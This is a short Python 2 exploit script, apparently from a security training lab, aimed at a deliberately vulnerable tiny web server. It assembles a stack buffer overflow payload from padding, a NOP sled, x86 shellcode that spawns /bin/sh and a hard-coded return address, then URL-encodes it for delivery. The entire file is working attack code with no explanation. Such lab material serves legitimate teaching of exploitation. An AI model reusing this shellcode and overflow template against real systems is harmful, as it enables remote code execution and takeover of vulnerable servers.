'''
Lab1 Exploit - Stack-Buffer-Overflow - NX Basics
URL: https://github.com/ingenuity-ninja/damn-vulnerable-tiny-web-server
'''
import struct
import urllib
SIZE = 524
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_SIZE = 25
NOP = "\x90"
NOP_SIZE = 100
PADDING = "\x41"
PADDING_SIZE = SIZE - SHELLCODE_SIZE - NOP_SIZE
EIP = struct.pack("I", 0xffffd5a4)
PAYLOAD = PADDING*PADDING_SIZE + NOP*(NOP_SIZE/2) + SHELLCODE + NOP*(NOP_SIZE/2)+ EIP
print urllib.quote_plus(PAYLOAD)